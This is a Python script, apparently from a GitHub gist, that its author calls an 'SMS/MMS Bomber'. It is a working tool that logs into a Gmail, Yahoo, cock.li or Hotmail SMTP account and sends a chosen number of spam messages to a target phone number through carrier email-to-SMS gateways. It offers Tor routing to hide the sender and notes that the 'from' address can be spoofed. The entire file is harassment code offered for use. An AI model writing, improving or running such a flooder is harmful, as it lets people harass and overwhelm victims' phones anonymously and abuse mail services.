#! /usr/bin/env python3
"""
 * SMS/MMS Bomber via SMTP with a wide variety of features.
 * Author: Willy Fox (@BlackVikingPro)
 * Last Updated: 6/18/2019
 * GitHub Gist: https://gist.github.com/BlackVikingPro/88ac7c142a594a6aa44728a3e66669c4
 *
 * Todo:
 * - Add Sub-Parser (for SMS & MMS support)
 * - Add Sub-Parser for Email Spoofing Option
"""

import time, smtplib, sys, getpass, argparse, socks, socket, requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def usage(err=''):
	if err:
		print("\n [*] " + err)
		sys.exit()
		pass
	print("""
 * SMS/MMS Bomber via SMTP with a wide variety of features.
 * Author: Willy Fox (@BlackVikingPro)
 * Last Updated: 6/18/2019
 * GitHub Gist: https://gist.github.com/BlackVikingPro/88ac7c142a594a6aa44728a3e66669c4
 *
 * Todo:
 * - Add Sub-Parser (for SMS & MMS support)
 * - Add Sub-Parser for Email Spoofing Option

Usage:
	[Optional]
		--verbose, -v		-- Enable verbose mode.
		--tor, -t		-- Enable Tor proxy routing.

	[Required]
		--emailprov, -ep	-- Email provider (gmail, yahoo, cockli, hotmail)
		--targetemail, -te	-- From email address (can be spoofed)
		-carrier, -cc		-- Target cell phone's carrier [att|cellone|verizon|etc]
		--destaddr, -d		-- Destination address [10 digit phone number (example: 5551234567)]
								- (Country Code => (1) Area Code => (123) Phone # => (4567890))
								- (Command Line Format: 11234567890)
		--message, -m		-- Message to spam
		--count, -c		-- Number of messages to send

Example:
	python3 sms-bomber.py -ep gmail -cc att -te example@gmail.com -d 1123456789 -m "test" -c 5

Troubleshooting:
	* Gmail accounts require you to allow "Less Secure Apps" in order to login through RAW SMTP connections
		- (see https://support.google.com/a/answer/6260879)
	""")
	pass

try:
	if sys.argv[1] in ('', 'help', 'h', '-h', '-help', '--help', '/?', '?'):
		usage()
except IndexError:
	sys.exit(usage())

supported_carriers = [
	'att',
	'cellone',
	'verizon',
	'alltel',
	'boost',
	'cricket',
	'metropcs',
	'sprint',
	'nextel',
	'straighttalk',
	'tmobile',
	'uscellular',
	'virgin'
]
	
carrier_combos = [
	'att', '@txt.att.net',
	'cellone', '@sms.cellonenation.net',
	'verizon', '@vtext.com',
	'alltel', '@message.alltel.com',
	'boost', '@myboostmobile.com',
	'cricket', '@sms.mycricket.com',
	'metropcs', '@mymetropcs.com',
	'sprint', '@messaging.sprintpcs.com',
	'nextel', '@page.nextel.com',
	'straighttalk', '@vtext.com',
	'tmobile', '@tmomail.net',
	'uscellular', '@email.uscc.net',
	'virgin', '@vmobl.com',
]

emprov_combos = [
	'gmail', 'smtp.gmail.com',
	'yahoo', 'smtp.mail.yahoo.com',
	'cockli', 'mail.cock.li',
	'hotmail', 'smtp.live.com',
]

argParseObj = argparse.ArgumentParser()

argParseObj.add_argument("--verbose", "-v", action="store_true", help="Enable Verbose Mode.")
argParseObj.add_argument("--tor", "-t", action="store_true", help="Enable Tor Proxy (must have Tor controller running on 127.0.0.1:9050")

argParseReqVarGroup = argParseObj.add_argument_group("[Required Variables]")
argParseReqVarGroup.add_argument("--emprov", "-ep", required=True, choices=['gmail', 'yahoo', 'cockli', 'hotmail'])
argParseReqVarGroup.add_argument("--targetemail", "-te", required=True, help="Target email address to send bulk email from.")
argParseReqVarGroup.add_argument("--carrier", '-cc', required=True, choices=supported_carriers)
argParseReqVarGroup.add_argument("--destaddr", "-d", required=True, help="Destination Phone Number Address | Syntax: 16664206969.")
argParseReqVarGroup.add_argument("--message", "-m", required=True, help="Message to spam via SMS!")
argParseReqVarGroup.add_argument("--count", "-c", required=True, type=int)

argParsedObj = argParseObj.parse_args()

def sendmail(emprov, targetemail, carrier, destaddr, message, count):
	fullMessage = MIMEMultipart()
	fullMessage.attach(MIMEText(message, 'plain'))

	if carrier in supported_carriers:
		carrier_email = carrier_combos[(carrier_combos.index(carrier) + 1)]
	else:
		usage("Carrier not supported.")

	if emprov in emprov_combos:
		emailAPICallback = emprov_combos[(emprov_combos.index(emprov) + 1)]
	else:
		usage("Email provider not supported. Below providers are supported.")
		sys.exit()

	password = getpass.getpass("Password for '" + targetemail + "': ")
	print("")
	fullTargetEmail = destaddr + carrier_email

	if (argParsedObj.tor):
		try:
			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
			socket.socket = socks.socksocket
			print(" [*] Tor is enabled. Current identity: " + requests.get("http://ipinfo.io/ip").text)
		except Exception as e:
			sys.exit(e)

	print(" [*] Initializing Connection to '" + emailAPICallback + "':587\n")
	try:
		server = smtplib.SMTP(emailAPICallback, 587) # open connection
		server.starttls() # start tls connection
	except Exception as e:
		sys.exit(e)

	try:
		server.login(targetemail, password) # login
	except smtplib.SMTPAuthenticationError: 
		print(" [*] Login failed.\n")
		sys.exit()

	if (argParsedObj.verbose):
		print(fullMessage.as_string())

	# start the loop
	try:
		x = 0
		for _ in range(0, count):
			server.sendmail(targetemail, fullTargetEmail, fullMessage.as_string())

			nums = []
			nums.append(x + 1)
			_range = ['_']

			for x in nums:
				sys.stdout.write( "\r [*] Successfully sent %s/%s " % (x, count) )
				sys.stdout.flush()
	except KeyboardInterrupt:
		print("\n\nExiting cleanly...")
		server.quit()
		sys.exit()
		pass
	except Exception as e:
		print("Something went wrong!")
		print(e)

	# Cleanup and quit
	server.quit()
	sys.exit("\n\nThanks for using SMS Bomber!\nFind more projects at https://github.com/BlackVikingPro")
	pass
 
if __name__ == '__main__':
	sendmail(argParsedObj.emprov, argParsedObj.targetemail, argParsedObj.carrier, argParsedObj.destaddr, argParsedObj.message, argParsedObj.count)
	pass
